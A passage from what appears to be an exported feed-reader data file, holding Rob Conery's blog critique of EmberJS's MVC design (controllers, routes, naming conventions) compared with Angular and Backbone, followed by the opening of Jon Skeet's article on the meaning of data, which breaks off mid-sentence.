statements. It's my honest take on this framework.</p><h2>You Keep Telling Me It's MVC...</h2><p>Yes, the concept of MVC has been contorted over the past decade as web frameworks have adopted it and massaged it to their own ends. What does this mean?</p><ul><li>Controllers in web MVC have a very short lifespan, and there are a lot of them typically</li><li>Views dont' communicate directly to a controller - they have to use an intermediary layer in HTTP (headers, querystring, etc)</li><li>Models are injected into views by Controllers</li><li>Controllers don't command the views directly</li></ul><p>In more classic MVC (aka\"Desktop\") your controllers are typically spun up when the app starts, and configured one time, right there. A controller's job is to command aspects of the view as data changes, and to change the model when things on the view happen that mandate it.</p><p>The model encapsulates the business logic for whatever its modeling, the view presents the data in a nicely formatted way to the user, and the controller sits between. I think we agree on this much - so what's the problem?</p><p>OK this is MVC as far as I have come to know it. There are lots of denominations I am sure - I have to think the church of MVC is about as crowded as the church of REST on any given holiday but there's room for all of us so let's move on...</p><h2>Separation. Only Not.</h2><p>In EmberJS, the<a href=\"http://emberjs.com/guides/controllers/\">controller's job is changed a bit</a>:</p><blockquote><p>A controller may have one or both of these responsibilities:</p><ul><li>Representing a model for a template.</li><li>Storing application properties that do not need to be saved to the server.</li></ul><p>Most of your controllers will be very small. Unlike other frameworks, where the state of your application is spread amongst many controllers, in Ember.js, we encapsulate that state in the router. This allows your controllers to be lightweight and focused on one thing.</p></blockquote><p>For me, this is where the confusion begins. A controller proxies the model, and then exposes itself to the rendering engine so that the view can consume it (you may need to read that sentence twice). As a result, we have view code like this (this is Handlebars):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'>{{#each person in personController}}</span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>{{name}}<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'>{{/each}}</span></code></pre></td></tr></table></div></figure><p>This can be shorthanded to this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'>{{#each controller}}</span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>{{name}}<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'>{{/each}}</span></code></pre></td></tr></table></div></figure><p><strong>This is where I hit a conceptual wall</strong>. First: let me say that I'm not the best programmer in the world and I could be dead wrong on this. But as far as I understand it, this is about as tightly bound as we can make things.</p><p>As stated above, a controller\"proxies\" the model onto itself for use in the view. I'm trying my best to reconcile this with the notion that a controller (classically speaking) is supposed to ... well<strong>control</strong>the view. Here, it's not doing that.</p><p>If I'm not mistaken, the view is controlling the controller and the model is nowhere to be found. Well that's not true I spose:<strong>the model is the controller</strong>. Sort of. Well it's not literally the same thing in concept but in practice the controller and the model are one. Bound. Together. Tightly.</p><p>In Angular this separation is achieved by a\"scope\" object that is, basically, a vehicle of sorts that gets passed between the controller and the view:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">PersonCtrl</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">people</span><span class=\"o\">=</span><span class=\"p\">[{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Rob\"</span><span class=\"p\">},</span><span class=\"p\">{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Mary\"</span><span class=\"p\">}]</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>In your view, you declare which controller you're using and then consume the information that's on the scope:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-app</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-controller=</span><span class=\"s\">'PersonCtrl'</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">'person in people'</span><span class=\"nt\">&gt;</span>{{name}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span></code></pre></td></tr></table></div></figure><p>The downside to this approach is that your HTML is\"compromised\", if you will, and many developers don't like that. My thought is that<strong>it's already compromised using Handlebars</strong>so what's the difference here?  Personally I have no issue using the ng-* directives. Some people do, and I respect that.</p><p>But let's get to the controller code. Notice that the $scope is injected? That's Dependency Injection at work and is a core concept in Angular which greatly helps testability.</p><p>Now you might be saying\"but ROB! The controller is declared directly in the view! That's the same problem!\". And that's true - until you loop in routing (below) and you can remove that directive since it's handled explicitly by routing:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-app</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">'person in people'</span><span class=\"nt\">&gt;</span>{{person.name}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span></code></pre></td></tr></table></div></figure><p>In Backbone a view is created (optionally) with the model (or collection) that it needs for data. There are no controllers (classically) in Backbone - though you can surely wedge one if needed and have it deal with the view.</p><p>These concepts align with my understanding of MVC. Not the case with Ember - if anything it confuses me greatly.</p><h2>Routes, Objects, and More Confusion</h2><p>I can get past the controller issue - I'm not a purist and if there's a reason the team wanted it this way, then I believe them.<a href=\"http://yehudakatz.com/\">It's Yehuda</a>and I think Yehuda is a very nice and smart person (as is<a href=\"http://tomdale.net/\">Tom Dale</a>- the co-creator of Ember).</p><p>I respect these guys so much I want to be very careful to<strong>not suggest</strong>that they don't know what they're doing. As I keep saying:<strong>this is my confusion</strong>. I own it.</p><p>Which brings me to Routes. Here's<a href=\"http://emberjs.com/guides/routing/defining-your-routes/\">one way to define a route</a>using EmberJS that looks rather familiar:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">resource</span><span class=\"p\">(</span><span class=\"s1\">'posts'</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s1\">'/posts'</span><span class=\"p\">},</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s1\">'new'</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Rails devs will recognize this straight away as a Resourceful Route. But what does a\"resource\" have to do with a Desktop app? When talking routes, urls, and resources - that's a RESTful consideration and involves stateless state\"stuff\" (sidestepping the REST debate here).<strong>What is this concept doing in a desktop app?</strong>.</p><p>Here's another way to define a route:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"about\"</span><span class=\"p\">);</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/favs\"</span><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This is straightforward. Client MVC apps can manipulate browser history with\"hashbang\" URLs for bookmarking convenience. To manage that, we use a router and define routes.</p><p>And if you know that Ember relies heavily on naming conventions you could probably assume that you'll need an AboutController and a FavoritesController (like Rails - and Yehuda is a Rails core dev too so it would make sense...).</p><p>But that's not quite what needs to happen. You need to also define a RouteObject (which you can think of as a route handler):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">FavoritesRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Favorites</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">setupController</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">controller</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">'content'</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>I've been repeatedly told that\"Ember uses MVC in the classical Desktop way\" following Cocoa/Smalltalk style. OK I can buy that - but if that's the case<strong>why are controllers being tied to routes and models</strong>, conceptually? That might make sense for the web, but hardly for a desktop app.</p><p>Now I completely understand that we can throw theory at this<a href=\"http://st-www.cs.illinois.edu/users/smarch/st-docs/mvc.html\">and that Smalltalk-80 MVC</a>was instrumental in forming the concept behind Ember.</p><p>But even then - one model could be used in many controllers (and the reverse) depending on the need. I'm happy to shift my mind into Desktop mode - but it seems Ember still wants to retain some conceptual likeness to Rails, which I find most ... strange.</p><p>I remember watching<a href=\"http://blog.peepcode.com\">Geoffrey Grosenbach</a>explaining this in<a href=\"https://peepcode.com/products/emberjs\">Peepcode's very well done video tutorial on EmberJS</a>and feeling rather confused. I rewound the section and played it back, to see if I could understand what I was seeing.</p><p>And rewound it a few more times after that. It wasn't sinking in. I could not understand the difference between declaring a route, and configuring a RouteObject. Why not have the URL be a setting on the Ember.Route?</p><p>Now it could be that it was this way in the past - I've only gotten to know Ember 1.0 rc1 and I also know that the API changes rather dramatically from time to time.</p><p>But this is really confusing.</p><p>Here's how you do it in Angular:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//declare the app and any dependencies</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">App</span><span class=\"o\">=</span><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s2\">\"App\"</span><span class=\"p\">,[]);</span></span><span class='line'></span><span class='line'><span class=\"c1\">//configure the app, injecting the Route Provider</span></span><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">config</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$routeProvider</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$routeProvider</span></span><span class='line'><span class=\"p\">.</span><span class=\"nx\">when</span><span class=\"p\">(</span><span class=\"s2\">\"/about\"</span><span class=\"p\">,</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">templateUrl</span><span class=\"o\">:</span><span class=\"s2\">\"about.html\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"s2\">\"App.AboutCtrl\"</span></span><span class='line'><span class=\"p\">})</span></span><span class='line'><span class=\"p\">.</span><span class=\"nx\">when</span><span class=\"p\">(</span><span class=\"s2\">\"/favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"s2\">\"App.FavoritesCtrl\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">templateUrl</span><span class=\"o\">:</span><span class=\"s2\">\"favorites.html\"</span></span><span class='line'><span class=\"p\">})</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Angular's approach is interesting and somewhat\"concept-y\" if you're not familiar with Dependency Injection. Once you get past that (or maybe you love it already) it becomes straightforward to understand that\"here's a route, use this template and this controller\". This is straight up configuration:<strong>which is exactly what the method name is</strong>.</p><p>I love parity between method names and the code I'm writing.</p><p>Here's how you do it in Backbone:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"o\">=</span><span class=\"nx\">Backbone</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">routes</span><span class=\"o\">:</span><span class=\"p\">{</span></span><span class='line'><span class=\"s2\">\"/about\"</span><span class=\"o\">:</span><span class=\"s2\">\"showAbout\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"s2\">\"/favorites\"</span><span class=\"o\">:</span><span class=\"s2\">\"showFavorites\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">showAbout</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//render the view, or call to a controller</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">showFavorites</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//render the view, or call to a controller</span></span><span class='line'><span class=\"p\">},</span></span></code></pre></td></tr></table></div></figure><p>The Router in Backbone is also a bit confusing - there's no doubt about it. It can quickly turn into a mess of configuration AND instrumentation - in other words doing a controller's job.</p><p>I think this is why the Ember team tried to separate the configuration of the routes from the route itself. But in doing so they marginalized the controller (which was their intent, if you read the controller's definition).</p><p>With Backbone I know what I'm getting into. I can use the Router as a controller (it used to be called that btw) and when things get a bit nuts, I can create a controller of my very own (<a href=\"http://marionettejs.com\">or just use MarionetteJS that has this concept built in</a>).</p><h2>Naming</h2><p>Ember relies heavily on naming conventions that must not only follow<a href=\"http://www.emberist.com/2012/04/09/naming-conventions.html\">syntax guidelines, but also casing guidelines</a>.</p><p>The reason for this is straightforward: Ember will generate code for you if you just need basic, boilerplated stuff, alleviating you from tedious coding which is rampant in other frameworks like Backbone.</p><p>The problem I have with this is that the relationship between things is in name only, and that seems like it's a rather brittle rule. It also tells me that I have to know the naming conventions<strong>as well as</strong>how to use the framework - which is fine, typically, as long as there's a big payoff.</p><p>And that's where I get stuck (again):<strong>what's the payoff, aside from implicit code generation, for following the naming conventions here?</strong>. Consider the routing code, above:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"about\"</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/about\"</span><span class=\"p\">});</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/favs\"</span><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">FavoritesRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Favorites</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">setupController</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">controller</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">'content'</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>The only way I know that one thing depends on the other is by name. Now I know that should seem obvious and you might be thinking\"well duh, Rob, that's the point!\". Yes, but it's also a great way to have a highly confusing API.</p><p>What's the problem with something like this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">FavoritesRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"about\"</span><span class=\"p\">,</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/about\"</span><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Favorites</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">setupController</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">controller</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">'content'</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This, to me, is a whole lot more apparent and I'm not reconciling functionality through a naming filter. For some that might be much easier than reading the code (or reading the tests) - to me it seems arbitrary and confusing.</p><h2>You Asked, I Answered</h2><p>In wrapping this up, I would like to say that I am writing this as a way to make my points a bit clearer to Trek as Twitter doesn't work well for this kind of thing. He didn't understand my confusion about Ember (specifically why I didn't think it aligned with my understanding of MVC) so I told him I'd write something that explained my confusion.</p><p>It would be easy to see this as\"Rob ranting on Ember\" and I'm sure it will be taken that way by many. Not my intent, really. I have 4 videos to edit in front of me, and a book to write. I took time out of my day to respectfully respond to the Ember team with my thoughts - even if they're not glowing and exciting with praise.</p><p>If Ember works for you I think that's great. It doesn't work for me.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=fCXbpkBXK6M:hHMSfTcE-sk:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=fCXbpkBXK6M:hHMSfTcE-sk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=fCXbpkBXK6M:hHMSfTcE-sk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/fCXbpkBXK6M\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1278}}
{"k":"0000000084","o":"0000010241","v":"001"}
{"_id":1279,"_uid":1279,"_dt":1373742620977,"_s":"57fba831d5c60779d1e4e4dee3b1f85a"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/QJMAbYtTxjg/but-what-does-it-all-mean.aspx","title":"But what does it all mean?","published":{"$wrap":"$date","v":1371794457000,"h":"2013-06-21T06:00:57.000Z"},"starred":false,"read":false,"content":"<blockquote><p>This year before NDC, I wrote an article for the<a href=\"http://issuu.com/developermagazine/docs/developer_ndc_2013_web\">conference edition of\"The Developer\" magazine</a>. Follow that link to find the article in all its illustrated glory (along with many other fine articles, of course) – or read on for just the text.</p></blockquote><p>Back when I used to post on newsgroups I would frequently be in the middle of a debate of the details of some behaviour or terminology, when one poster would say: “You’re just quibbling over semantics” as if this excused any and all previous inaccuracies. I would usually agree –  I was indeed quibbling about semantics, but there’s no “just” about it.</p><p>Semantics is<em>meaning</em>, and that’s at the heart of communication – so for example, a debate over whether it’s correct to say that Java uses pass- by-reference<sup>1</sup>is all about semantics. Without semantics, there’s nothing to talk about.<br />This has been going on for years, and I’m quite used to being the pedant in any conversation when it comes to terminology – it’s a topic close to my heart. But over the years – and importantly since my attention has migrated to Stack Overflow, which tends to be more about real problems developers are facing than abstract discussions – I’ve noticed that I’m now being picky in the same sort of way, but about the meaning of data instead of terminology.</p><h2>Data under the microscope</h2><p>When it comes down to it, all the data we use is just bits – 1s and 0s. We assemble order from the chaos by ascribing meaning to those bits… and not just once, but in a whole hierarchy. For example, take the bits 01001010 00000000:</p><ul><li>Taken as a little-endian 16-bit unsigned integer, they form a value of 74. • That 16-bit unsigned integer can be viewed as a UTF-16 code unit for the character ‘J’.</li><li>That character might be the first character within a string.</li><li>That string might be the target of a reference, which is the value for a field called “firstName”.</li><li>That field might be within an instance of a class called “Person”.</li><li>The instance of “Person” whose “firstName” field has a value<br />which is a reference to the string whose first character is ‘J’ might itself be the target of a reference, which is the value for a field called “author”, within an instance of a class called “Article”.</li><li>The instance of “Article” whose “author” field (fill in the rest your- self…) might itself be the target of a reference which is part of a collection, stored (indirectly) via a field called “articles” in a class called “Magazine”.</li></ul><p>As we’ve zoomed out from sixteen individual bits, at every level we’ve imposed meaning. Imagine all the individual bits of information which would be involved in a single instance of the Magazine with a dozen articles, an editorial, credits – and perhaps even images. Really imagine them, all written down next to each other, possibly without even the helpful gap between bytes that I included in our example earlier.</p><p><br />That’s the raw data. Everything else is “just” semantics.</p><h2>So what does that have to do with me?</h2><p>I’m sure I haven’t told you anything you don’t already know. Yes, we can impose meaning on these puny bits, with our awesome developer power. The trouble is that bits have a habit of rebelling if you try to impose the wrong kind of meaning on them… and we seem to do that quite a lot.</p><p>The most common example I see on Stack Overflow is treating text (strings) and binary data (image files, zip files, encrypted data) as if they were interchangeable. If you try to load a JPEG using StreamReader in .NET or FileReader in Java, you’re going to have problems. There are ways you can actually get away with it – usually by using the ISO-8859-1 encoding – but it’s a little bit like trying to drive down a road with a broken steering wheel, only making progress by bouncing off other obstacles.</p><p>While this is a common example, it’s far from the only one. Some of the problems which fall into this category might not obviously be due to the mishandling of data, but at a deep level they’re all quite similar:</p><ul><li>SQL injection attacks due to mingling code (SQL) with data (values) instead of using parameters to keep the two separate.</li><li>The computer getting arithmetic “wrong” because the developer didn’t understand the meaning of floating binary point numbers, and should actually have used a floating decimal point type (such as System.Decimal or java.math. BigDecimal).</li><li>String formatting issues due to treating the result of a previous string formatting operation as another format string – despite the fact that now it includes user data which could really have any kind of text in it.</li><li>Double-encoding or double-unencoding of text data to make it safe for transport via a URL.</li><li>Almost anything to do with dates and times, including – but certainly not limited to – the way that java.util.Date and System. DateTime values don’t inherently have a format. They’re just values.</li></ul><p>The sheer bulk of questions which indicate a lack of understanding of the nature of data is enormous. Of course Stack Overflow only shows a tiny part of this – it doesn’t give much insight into the mountain of code which handles data correctly from the perspective of the types involved, but does entirely inappropriate things with those values from the perspective of the intended business meaning of those values.</p><p>It’s not all doom and gloom though. We have some simple but powerful weapons available in the fight against semantic drivel.</p><h3>Types</h3><p>This article gives a good indication of why I’m a fan of statically typed languages. The type system can convey huge amounts of information about the nature of data, even if the business meaning of values of those types can be horribly overloaded.</p><p><em>Maybe</em>it would be good if we distinguished between human-readable text which should usually be treated in a culture-sensitive way, and machine-parsable text which should usually be treated without reference to any culture. Those two types might have different operations available on them, for example – but it would almost certainly get messy very quickly.</p><p>For business-specific types though, it’s usually easy to make sure that each type is really only used for one concept, and only provides operations which are meaningful for that concept.</p><h3>Meaningful names</h3><p>Naming is undoubtedly hard, and I suspect most developers have had the same joyless experiences that I have of struggling for ten minutes to come up with a good class or method name, only to end up with the one we first thought of which we really don’t like… but which is simply better than all the other options we’ve considered. Still, it’s worth the struggle.</p><p>Our names 